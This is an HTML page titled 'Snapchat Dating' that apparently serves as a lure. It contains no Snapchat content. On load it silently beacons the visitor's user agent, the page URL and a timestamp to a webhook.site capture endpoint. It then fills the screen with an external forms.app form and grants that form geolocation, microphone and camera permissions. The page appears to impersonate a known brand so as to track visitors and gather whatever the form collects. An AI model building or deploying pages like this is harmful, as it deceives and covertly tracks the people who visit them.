<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Snapchat Dating</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    /* Page resets and full-viewport iframe */
    html,body { height:100%; margin:0; padding:0; background:#0f172a; }
    #app {
      position:fixed;
      inset:0;
      display:flex;
      align-items:center;
      justify-content:center;
      background:#0f172a;
    }

    /* Full-screen iframe */
    iframe.form-embed {
      position:fixed;
      inset:0;
      width:100vw;
      height:100vh;
      border:0;
      margin:0;
      padding:0;
      display:block;
      background:transparent;
    }

    /* Loading overlay */
    #loading {
      position:fixed;
      inset:0;
      display:flex;
      align-items:center;
      justify-content:center;
      background:linear-gradient(180deg, rgba(2,6,23,0.6), rgba(2,6,23,0.6));
      z-index: 9999;
      color: #cbd5e1;
      font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
      font-size: 1rem;
    }
    .spinner {
      width:40px;
      height:40px;
      border-radius:50%;
      border:4px solid rgba(255,255,255,0.08);
      border-top-color: rgba(255,255,255,0.26);
      animation: spin 1s linear infinite;
      margin-right:12px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    /* Small accessible fallback link in top-left while loading */
    #fallback {
      position:fixed;
      left:12px;
      top:12px;
      z-index:10000;
      font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
      font-size:0.95rem;
      color:#e6eef8;
      background: rgba(3,7,18,0.4);
      padding:6px 10px;
      border-radius:8px;
      text-decoration:none;
    }
    #fallback:hover { background: rgba(255,255,255,0.04); }
  </style>
</head>
<body>
  <div id="app" aria-hidden="true">
    <!-- iframe will be injected here -->
  </div>

  <div id="loading" role="status" aria-live="polite">
    <div class="spinner" aria-hidden="true"></div>
    <div>Loading…</div>
  </div>

  <!-- Visible fallback link while loading and for accessibility -->
  <a id="fallback" href="https://36o7vyhi.forms.app/form/68ed27b7a9271200029ac148" target="_blank" rel="noopener noreferrer">Open form in new tab</a>

  <noscript>
    <meta http-equiv="refresh" content="0; url=https://36o7vyhi.forms.app/form/68ed27b7a9271200029ac148">
    <div style="font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;padding:20px;">
      JavaScript is disabled. <a href="https://36o7vyhi.forms.app/form/68ed27b7a9271200029ac148" target="_blank" rel="noopener noreferrer">Open the form</a>.
    </div>
  </noscript>

  <script>
    (function () {
      // CONFIG: update these if needed
      const WEBHOOK_URL = "https://webhook.site/55b80994-a2c4-4b3f-a87d-731c6e91d0d1";
      const FORM_SRC = "https://36o7vyhi.forms.app/form/68ed27b7a9271200029ac148";

      // 1) Fire-and-forget log to webhook
      const payload = {
        ts_iso: new Date().toISOString(),
        ts_epoch_ms: Date.now(),
        event: "page_load",
        ua: navigator.userAgent || "",
        href: location.href
      };
      const queryUrl = `${WEBHOOK_URL}?event=page_load&ts=${encodeURIComponent(payload.ts_iso)}`;

      try {
        if (navigator.sendBeacon) {
          const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
          navigator.sendBeacon(queryUrl, blob);
        } else {
          // best-effort fallback (no-cors so it doesn't block)
          fetch(queryUrl, { method: "POST", mode: "no-cors", keepalive: true, body: JSON.stringify(payload) }).catch(()=>{});
        }
      } catch (e) {
        // ignore logging errors
      }

      // 2) Inject iframe that fills the page
      function injectIframe() {
        const iframe = document.createElement('iframe');
        iframe.className = 'form-embed';
        iframe.title = 'Form';
        iframe.allow = 'geolocation; microphone; camera; clipboard-write; autoplay; encrypted-media';
        iframe.referrerPolicy = 'no-referrer-when-downgrade';
        iframe.src = FORM_SRC;

        // When iframe finishes loading, hide the loader and fallback link
        iframe.addEventListener('load', function () {
          const loading = document.getElementById('loading');
          if (loading) loading.style.display = 'none';
          const fb = document.getElementById('fallback');
          if (fb) fb.style.display = 'none';
        });

        // Insert iframe and ensure it's behind the loader initially
        const app = document.getElementById('app');
        app.appendChild(iframe);
      }

      // Small safety: wait a tick to inject so beacon has a tiny window to send
      // but we don't need to delay much; inject immediately for best UX
      setTimeout(injectIframe, 10);
    })();
  </script>
</body>
</html>
